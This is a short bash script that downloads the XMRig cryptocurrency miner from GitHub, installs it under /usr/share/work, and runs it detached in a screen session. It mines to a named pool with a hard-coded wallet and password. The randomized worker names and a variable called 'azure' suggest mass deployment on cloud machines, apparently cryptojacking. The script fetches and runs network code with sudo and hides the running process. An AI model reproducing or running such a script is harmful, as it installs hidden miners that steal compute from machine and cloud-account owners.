#!/bin/bash
sudo apt-get update
azure=mxsemsdnlkdj;
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-3.2.0
wget https://github.com/xmrig/xmrig/releases/download/v3.2.0/xmrig-3.2.0-xenial-x64.tar.gz 
mv xmrig-3.2.0-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf xmrig-3.2.0-xenial-x64.tar.gz
rm -rf xmrig-3.2.0-xenial-x64.tar.gz && cd xmrig-3.2.0
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
echo $cpuname" is starting"
screen -d -m ./xmrig --donate-level 1 -o loki.pool.mine2gether.com:3331 -u LSkEijdmcNWSCHjzZPjzyEERnw7DFyQfofQTL79KEwmehzCVavMcbtPdYepV9XL3DQFDXpTUYg9PQJq8GKjzyMYw89D67Tn -p "Luan660777" -a argon2/chukwa -k -t 3
